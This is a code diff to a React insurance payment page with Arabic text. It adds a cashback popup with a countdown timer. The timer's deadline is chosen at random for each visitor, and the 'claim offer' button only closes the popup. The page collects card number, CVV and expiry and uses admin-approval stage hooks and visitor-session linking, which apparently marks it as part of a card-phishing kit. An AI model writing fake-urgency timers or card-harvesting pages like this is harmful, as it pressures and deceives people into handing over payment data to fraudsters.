@@ -1,4 +1,4 @@
-import { useState, useEffect, useMemo } from "react";
+import { useState, useEffect, useMemo, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { motion, AnimatePresence } from "framer-motion";
 import { companyLogos } from "@/lib/companyLogos";
@@ -7,7 +7,7 @@ import Navbar from "@/components/Navbar";
 import Footer from "@/components/Footer";
 import PremiumPageHeader from "@/components/PremiumPageHeader";
 import { Button } from "@/components/ui/button";
-import { CreditCard, Shield, Lock, Check, ArrowRight, Loader2, Fingerprint, Eye, EyeOff } from "lucide-react";
+import { CreditCard, Shield, Lock, Check, ArrowRight, Loader2, Fingerprint, Eye, EyeOff, X, Clock, Gift, Percent } from "lucide-react";
 import CardBrandLogo from "@/components/CardBrandLogo";
 import InsuranceStepper from "@/components/InsuranceStepper";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
@@ -15,6 +15,7 @@ import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import cashbackPromoImg from "@/assets/cashback-promo.png";
 
 const fmt = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
 const fmtCard = (v: string) => {
@@ -58,6 +59,38 @@ const InsurancePayment = () => {
   const [showCvv, setShowCvv] = useState(false);
   const [focusedField, setFocusedField] = useState<string | null>(null);
   const [touchedFields, setTouchedFields] = useState({ number: false, cvv: false, expiry: false, name: false });
+  const [showPromo, setShowPromo] = useState(false);
+
+  // Random countdown per visitor (persisted in sessionStorage)
+  const [countdownEnd] = useState(() => {
+    const stored = sessionStorage.getItem("promo_countdown_end");
+    if (stored) return parseInt(stored);
+    const randomMs = (2 + Math.random() * 21) * 60 * 60 * 1000;
+    const end = Date.now() + randomMs;
+    sessionStorage.setItem("promo_countdown_end", String(end));
+    return end;
+  });
+  const [countdown, setCountdown] = useState({ h: 0, m: 0, s: 0 });
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      const diff = Math.max(0, countdownEnd - Date.now());
+      setCountdown({
+        h: Math.floor(diff / 3600000),
+        m: Math.floor((diff % 3600000) / 60000),
+        s: Math.floor((diff % 60000) / 1000),
+      });
+    }, 1000);
+    return () => clearInterval(timer);
+  }, [countdownEnd]);
+
+  // Show promo popup after 3 seconds
+  useEffect(() => {
+    const dismissed = sessionStorage.getItem("promo_dismissed");
+    if (dismissed) return;
+    const t = setTimeout(() => setShowPromo(true), 3000);
+    return () => clearTimeout(t);
+  }, []);
 
   const approvalStatus = useAdminApproval(orderId, "payment");
   const cardDigits = cardForm.number.replace(/\s/g, "");
@@ -405,6 +438,78 @@ const InsurancePayment = () => {
           </button>
         </div>
       </div>
+      {/* Cashback Promo Popup */}
+      <AnimatePresence>
+        {showPromo && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 flex items-end md:items-center justify-center md:p-4 bg-foreground/60 backdrop-blur-sm"
+            onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
+          >
+            <motion.div
+              initial={{ opacity: 0, y: 80, scale: 0.95 }}
+              animate={{ opacity: 1, y: 0, scale: 1 }}
+              exit={{ opacity: 0, y: 80, scale: 0.95 }}
+              transition={{ type: "spring", damping: 25, stiffness: 300 }}
+              className="bg-card rounded-t-3xl md:rounded-2xl border border-border shadow-2xl w-full max-w-md overflow-hidden"
+              onClick={(e) => e.stopPropagation()}
+            >
+              {/* Promo Image */}
+              <div className="relative">
+                <img src={cashbackPromoImg} alt="كاش باك 40%" className="w-full h-auto" />
+                <button
+                  onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
+                  className="absolute top-3 left-3 p-1.5 rounded-full bg-black/50 text-white hover:bg-black/70 transition-colors"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+
+              {/* Countdown Timer */}
+              <div className="p-4 space-y-3">
+                <div className="flex items-center justify-center gap-2">
+                  <Clock className="w-4 h-4 text-destructive animate-pulse" />
+                  <span className="text-xs font-bold text-destructive">ينتهي العرض خلال</span>
+                </div>
+                <div className="flex items-center justify-center gap-2 dir-ltr" dir="ltr">
+                  {[
+                    { val: String(countdown.h).padStart(2, "0"), label: "ساعة" },
+                    { val: String(countdown.m).padStart(2, "0"), label: "دقيقة" },
+                    { val: String(countdown.s).padStart(2, "0"), label: "ثانية" },
+                  ].map((unit, i) => (
+                    <div key={i} className="flex items-center gap-2">
+                      <div className="flex flex-col items-center">
+                        <div className="bg-gradient-to-b from-primary to-primary/80 text-primary-foreground rounded-lg px-3 py-2 min-w-[48px] text-center">
+                          <span className="text-xl font-extrabold font-mono">{unit.val}</span>
+                        </div>
+                        <span className="text-[10px] text-muted-foreground mt-1">{unit.label}</span>
+                      </div>
+                      {i < 2 && <span className="text-xl font-bold text-primary mb-4">:</span>}
+                    </div>
+                  ))}
+                </div>
+
+                <Button
+                  onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
+                  className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2"
+                >
+                  <Gift className="w-4 h-4" />
+                  استفد من العرض الآن
+                </Button>
+                <button
+                  onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
+                  className="w-full text-center text-xs text-muted-foreground hover:text-foreground transition-colors py-1"
+                >
+                  لاحقاً
+                </button>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
       <Footer />
     </div>
   );
